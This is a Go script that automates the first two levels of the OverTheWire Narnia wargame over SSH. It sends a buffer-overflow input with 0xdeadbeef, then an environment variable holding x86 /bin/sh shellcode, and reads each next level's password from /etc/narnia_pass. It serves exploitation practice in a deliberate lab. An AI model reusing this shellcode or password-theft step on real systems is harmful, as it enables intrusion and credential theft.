package main

import (
	"bytes"
	"flag"
	"fmt"
	"log"
	"os"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/MJKWoolnough/memio"
)

const (
	host     = "narnia.labs.overthewire.org:2226"
	username = "narnia%d"
)

var (
	commands = [...][]string{
		//level 0
		[]string{
			"/narnia/narnia0;exit\n",
			"00000000000000000000" + string([]byte{0xef, 0xbe, 0xad, 0xde}) + "\n",
			"echo -n \"Password:\";cat /etc/narnia_pass/narnia1;exit\n",
		},
		//level 1
		[]string{
			"EGG=\"$(printf \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\")\" /narnia/narnia1;exit\n", // Shell Code from http://shell-storm.org/shellcode/files/shellcode-811.php
			"echo -n \"Password:\";cat /etc/narnia_pass/narnia2;exit\n",
		},
	}
	passwordBytes = []byte("Password:")
	sValueBytes   = []byte("SVALUE:")
	newLine       = []byte{'\n'}
)

func main() {
	var (
		level    uint
		password string
	)

	flag.UintVar(&level, "l", 0, "level number. > 0 requires password")
	flag.StringVar(&password, "p", "narnia0", "password for initial level")
	flag.Parse()

	stdout := make(memio.Buffer, 0, 41)

	// levels 0-24

	for n, cmds := range commands[level:] {
		n += int(level)
		log.Printf("Level %2d: Sending Commands...\n", n)

		s, err := ssh.Dial("tcp", host, &ssh.ClientConfig{
			User:            fmt.Sprintf(username, n),
			Auth:            []ssh.AuthMethod{ssh.Password(password)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		})
		if err != nil {
			log.Printf("Level %2d: error: %s\n", n, err)
			return
		}

		session, err := s.NewSession()
		if err != nil {
			log.Printf("Level %2d: error: %s\n", n, err)
			return
		} else if err = session.RequestPty("vt100", 40, 80, ssh.TerminalModes{
			ssh.ECHO:          0,
			ssh.TTY_OP_ISPEED: 14400,
			ssh.TTY_OP_OSPEED: 14400,
		}); err != nil {
			log.Printf("Level %2d: error: %s\n", n, err)
			return
		}

		session.Stdout = &stdout
		session.Stderr = os.Stderr
		wc, _ := session.StdinPipe()
		if err = session.Shell(); err != nil {
			log.Printf("Level %2d: error: %s\n", n, err)
			return
		}

		for _, cmd := range cmds {
			time.Sleep(time.Second * 2)
			if cmd == "%s\n" {
				p := bytes.Index(stdout, sValueBytes)
				if p < 0 {
					log.Printf("Level %2d: error: could not find svalue\n", n)
					return
				}
				l := bytes.Index(stdout[p:], newLine)
				if l < 0 {
					log.Printf("Level %2d: error: could not find end of svalue\n", n)
					return
				}
				cmd = fmt.Sprintf(cmd, bytes.TrimSpace(stdout[p+len(sValueBytes):p+l]))
			}
			_, err = wc.Write([]byte(cmd))
			if err != nil {
				os.Stdout.Write(stdout)
				log.Printf("Level %2d: error: %s\n", n, err)
				return
			}
			time.Sleep(time.Second)
		}

		wc.Close()
		session.Close()
		s.Close()

		p := bytes.Index(stdout, passwordBytes)
		if p < 0 {
			os.Stdout.Write(stdout)
			log.Printf("Level %2d: error: could not find password\n", n)
			return
		}
		l := bytes.Index(stdout[p:], newLine)
		if l < 0 {
			log.Printf("Level %2d: error: could not find end of password\n", n)
			return
		}

		password = string(bytes.TrimSpace(stdout[p+len(passwordBytes) : p+l]))

		if password == "" {
			log.Printf("Level %2d: error: found empty password\n", n)
			return
		}

		log.Printf("Level %2d: Password: %s\n", n, password)
		stdout = stdout[:0]
	}
}
